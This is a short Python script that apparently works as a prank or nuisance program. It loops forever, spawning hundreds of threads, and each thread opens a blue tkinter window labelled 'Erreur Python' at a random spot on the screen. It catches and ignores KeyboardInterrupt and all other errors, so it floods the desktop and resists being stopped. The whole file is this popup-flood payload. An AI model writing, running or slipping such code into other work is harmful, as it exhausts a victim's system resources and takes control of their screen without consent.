import tkinter as tk
import time
import threading
import random




def start():
    popUp = tk.Tk()
    random1 = random.randrange(1420)
    random2 = random.randrange(580)
    element = '500x500+' + str(random1) +'+'+ str(random2)
    popUp.geometry(element)
    popUp.configure(bg='blue')
    popUp.label = tk.Label(popUp, text='Erreur Python', font=('Segoe UI', 40), fg="white", bg="blue")
    popUp.label.grid(row=0, column=0, columnspan=3, sticky="nesw")
    popUp.mainloop()


def startThread() :
    thread = threading.Thread(target=start)
    thread.daemon = False
    thread.start()


def startLOL():
    for a in range(500) :
        startThread()

def startthe():
    thread = threading.Thread(target=startLOL)
    thread.daemon = False
    thread.start()



while True:
    try:
        startLOL()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        pass




